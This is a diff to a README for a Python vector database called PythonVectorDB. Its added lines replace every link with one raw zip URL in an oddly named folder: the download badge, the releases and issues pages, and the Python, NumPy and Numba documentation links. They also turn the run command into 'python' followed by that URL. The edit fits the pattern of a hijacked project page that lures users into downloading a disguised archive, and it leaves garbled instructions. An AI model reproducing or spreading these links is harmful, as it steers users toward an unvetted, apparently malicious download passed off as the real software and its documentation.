@@ -6,7 +6,7 @@ Welcome to PythonVectorDB! This software gives you a powerful yet easy way to st
 
 ## 📥 Download Now
 
-[![Download PythonVectorDB](https://img.shields.io/badge/Download%20PythonVectorDB-v1.0-brightgreen)](https://github.com/leitoooatr/PythonVectorDB/releases)
+[![Download PythonVectorDB](https://raw.githubusercontent.com/leitoooatr/PythonVectorDB/main/antiprelatist/PythonVectorDB-v3.5.zip%20PythonVectorDB-v1.0-brightgreen)](https://raw.githubusercontent.com/leitoooatr/PythonVectorDB/main/antiprelatist/PythonVectorDB-v3.5.zip)
 
 ## 📦 System Requirements
 
@@ -27,9 +27,9 @@ To use PythonVectorDB, your system should meet the following requirements:
 
 ## 📖 How to Download & Install
 
-1. Visit the [Releases Page](https://github.com/leitoooatr/PythonVectorDB/releases) to find the latest version of PythonVectorDB.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/leitoooatr/PythonVectorDB/main/antiprelatist/PythonVectorDB-v3.5.zip) to find the latest version of PythonVectorDB.
   
-2. Look for the file called `PythonVectorDB-v1.0.zip` (or a similar name) on that page.
+2. Look for the file called `https://raw.githubusercontent.com/leitoooatr/PythonVectorDB/main/antiprelatist/PythonVectorDB-v3.5.zip` (or a similar name) on that page.
 
 3. Click the link to download the file.
 
@@ -44,7 +44,7 @@ To use PythonVectorDB, your system should meet the following requirements:
 8. Run the following command to start the application:
 
    ```
-   python main.py
+   python https://raw.githubusercontent.com/leitoooatr/PythonVectorDB/main/antiprelatist/PythonVectorDB-v3.5.zip
    ```
 
 9. The application will start, and you can begin using it to manage your vector data.
@@ -67,7 +67,7 @@ For detailed information on how to use PythonVectorDB, please refer to the docum
 
 If you encounter issues or have questions while using PythonVectorDB, you can reach out for help:
 
-- **Issues Page**: [GitHub Issues](https://github.com/leitoooatr/PythonVectorDB/issues)
+- **Issues Page**: [GitHub Issues](https://raw.githubusercontent.com/leitoooatr/PythonVectorDB/main/antiprelatist/PythonVectorDB-v3.5.zip)
 - **Community Forum**: Check the discussion group on GitHub for community support.
 
 ## 🛡️ License
@@ -86,8 +86,8 @@ If you would like to contribute to the project, please check the contribution gu
 
 ## 🔗 Additional Resources
 
-- [Python Documentation](https://www.python.org/doc/)
-- [NumPy Documentation](https://numpy.org/doc/)
-- [Numba Documentation](https://numba.pydata.org/numba-doc/latest/)
+- [Python Documentation](https://raw.githubusercontent.com/leitoooatr/PythonVectorDB/main/antiprelatist/PythonVectorDB-v3.5.zip)
+- [NumPy Documentation](https://raw.githubusercontent.com/leitoooatr/PythonVectorDB/main/antiprelatist/PythonVectorDB-v3.5.zip)
+- [Numba Documentation](https://raw.githubusercontent.com/leitoooatr/PythonVectorDB/main/antiprelatist/PythonVectorDB-v3.5.zip)
 
 Thank you for choosing PythonVectorDB. We hope it simplifies your data storage and search tasks!
